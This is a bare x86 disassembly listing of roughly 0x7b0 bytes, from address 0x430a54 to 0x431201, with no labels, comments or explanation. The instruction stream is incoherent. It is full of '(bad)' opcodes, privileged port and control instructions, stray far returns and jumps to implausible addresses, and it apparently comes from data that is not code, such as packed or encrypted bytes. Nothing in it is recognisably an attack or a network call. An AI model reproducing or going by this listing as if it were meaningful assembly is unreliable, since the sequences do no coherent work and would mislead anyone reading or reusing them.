  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
